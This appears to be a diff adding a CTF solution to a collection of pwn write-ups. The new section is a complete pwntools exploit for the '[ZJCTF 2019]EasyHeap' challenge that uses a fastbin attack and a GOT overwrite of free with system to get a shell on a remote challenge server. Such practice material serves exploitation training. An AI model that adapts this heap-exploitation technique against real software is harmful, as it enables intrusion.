@@ -150,3 +150,60 @@ payload = b'a'*(0x80+8) + p64(one_gadget)
 p.sendlineafter(b'Input:\n', payload)
 p.interactive()
 ```
+
+### [ZJCTF 2019]EasyHeap
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './easyheap'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 26098)
+elf = ELF(filename)
+# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
+# libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')
+
+
+def heap_create(content, size=None):
+    p.sendlineafter(b'Your choice :', b'1')
+    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
+    p.sendlineafter(b'Content of heap:', content)
+
+def heap_edit(index, content, size=None):
+    p.sendlineafter(b'Your choice :', b'2')
+    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))
+    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
+    p.sendlineafter(b'Content of heap : ', content)
+
+def heap_delete(index):
+    p.sendlineafter(b'Your choice :', b'3')
+    p.sendlineafter(b'Index :',  bytes(f'{index}', encoding='utf8'))
+
+fake_chunk = 0x6020ad  # x/16gx 0x6020c0-0x10+5-8
+
+heap_create(b'@@@@@@@@', size=0x18)     # 0, 0x20
+heap_create(b'!!!!!!!!', size=0x18)     # 1, 0x20
+heap_create(b'????????', size=0x68)     # 2, 0x70
+heap_delete(2)                          # return 2 to fastbin
+heap_edit(1, b'}' * 0x18 + p64(0x71) + p64(fake_chunk) + p64(fake_chunk))  # Set fast chunk's fd
+heap_create(b']]]]]]]]', size=0x68)     # 2, 0x70, get the original chunk of 2
+heap_create(b'[[[[[[[[', size=0x68)     # 3, 0x70, get the fake chunk
+# -_-||| cat: /home/pwn/flag: No such file or directory
+# heap_edit(3, b':'*(0x6020c0-0x6020bd) + p64(0x1333))
+
+
+# https://n0vice.top/2020/04/25/%E5%B8%B8%E8%A7%81fastbin-attack%E5%A5%97%E8%B7%AF%E5%AD%A6%E4%B9%A0/
+# 写入system的plt地址到free的got，再free(/bin/sh)
+heap_array = 0x6020e0  # p/x &heaparray
+log.info(f'free@got={hex(elf.got["free"])}, system@plt={hex(elf.plt["system"])}')
+heap_edit(3, b':'*(0x6020e0-(fake_chunk + 0x10)) + p64(elf.got["free"]))
+heap_edit(0, p64(elf.plt["system"]))
+heap_edit(2, b'/bin/sh')
+heap_delete(2)
+
+# p.sendlineafter(b'Your choice :', bytes(f'{0x1305}', encoding='utf8'))
+p.interactive()
+```
